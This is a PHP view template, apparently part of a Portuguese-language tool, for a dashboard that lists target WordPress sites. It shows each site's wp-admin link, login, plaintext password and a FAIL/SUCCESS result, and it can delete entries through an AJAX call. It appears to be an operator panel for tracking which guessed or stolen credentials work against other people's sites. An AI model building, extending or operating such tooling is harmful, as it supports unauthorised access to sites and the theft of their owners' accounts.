<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ADP PROSPECTION</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body style="background-color:#000">

    <section class="" style="margin: 50px; margin-top:50px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-2 text-black">
                    <?php $this->load->view('comp/menu'); ?>

                </div>
                <div class="col-sm-10 px-0 d-none d-sm-block">

                    <div style="margin:50px">
                        <table class="table table-dark">
                            <thead>
                                <tr>
                                    <th style="font-size: 12px;" scope="col">WP</th>
                                    <th style="font-size: 12px;" scope="col">ID</th>
                                    <th style="font-size: 12px;" scope="col">LOGIN</th>
                                    <th style="font-size: 12px;" scope="col">PASSWORD</th>
                                    <th style="font-size: 12px;" scope="col">DATA</th>
                                    <th style="font-size: 12px;" scope="col">REPUTATION</th>
                                    <!-- <th style="font-size: 12px;text-align:center" scope="col">ACTION</th> -->


                                </tr>
                            </thead>
                            <tbody>

                                <?php foreach ($this->tung_model->get_adp_prospection_credentials() as $adp) { ?>
                                    <tr>
                                        <td style="font-size:12px"><a style="cursor: pointer;" target="_blank" href="https://<?= $adp->alvo_url ?>/wp-admin"><i class="fa fa-link"></i></a></td>
                                        <td style="font-size:12px"><i style="cursor: pointer;" class="fa fa-envelope" title="<?= $adp->alvo_email ?>"></i></td>
                                        <td style="font-size:12px"><?= $adp->alvo_login ?></td>
                                        <td style="font-size:12px"><?= $adp->alvo_password ?></td>
                                        <td style="font-size:12px"><?= $adp->alvo_data ?></td>
                                        <td style="font-size:12px"><?php
                                                                    if ($adp->alvo_reputation == 0) {
                                                                        echo '<span class="badge badge-danger">FAIL<span/>';
                                                                    } else {
                                                                        echo '<span class="badge badge-success">SUCCESS<span/>';
                                                                    }
                                                                    ?></td>


                                        <td style="font-size:12px"> <button onclick="deleteTarget(<?= $adp->id ?>)" id="<?= $adp->id ?>" title="EXCLUIR" type="button" class="btn btn-danger">
                                                <i class="fas fa-close"></i>
                                            </button></td>

                                    </tr>
                                <?php } ?>
                            </tbody>
                        </table>
                    </div>

                </div>
            </div>
        </div>
    </section>

    <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

    <script>
        function deleteTarget(target_id) {

            swal({
                title: "Tem certeza?",
                text: "Tem certeza que deseja excluir?",
                icon: "warning",
                buttons: [
                    'Não, cancelar!',
                    'Sim, excluir!'
                ],
                dangerMode: true,
            }).then(function(isConfirm) {
                if (isConfirm) {

                    $.ajax({
                        method: 'POST',
                        url: '<?= base_url() ?>alvos/act_delete_credential',
                        data: {
                            alvo_id: target_id,

                        },
                        success: function(data) {
                            var resp = JSON.parse(data)

                            if (resp.status == "true") {

                                swal({
                                    title: 'Sucesso!',
                                    text: resp.message,
                                    icon: 'success',
                                    confirmButtonText: 'Entendi'
                                }).then((e) => {
                                    location.reload()
                                })


                            } else {
                                swal({
                                    title: 'Ops!',
                                    text: resp.message,
                                    icon: 'success',
                                    confirmButtonText: 'Entendi'
                                })
                            }
                        },
                        error: function(data) {
                            swal({
                                title: 'Ops!',
                                text: 'Ocorreu um erro temporário.',
                                confirmButtonText: 'Entendi'
                            })
                        },
                    });

                }
            })

        }
    </script>
</body>

</html>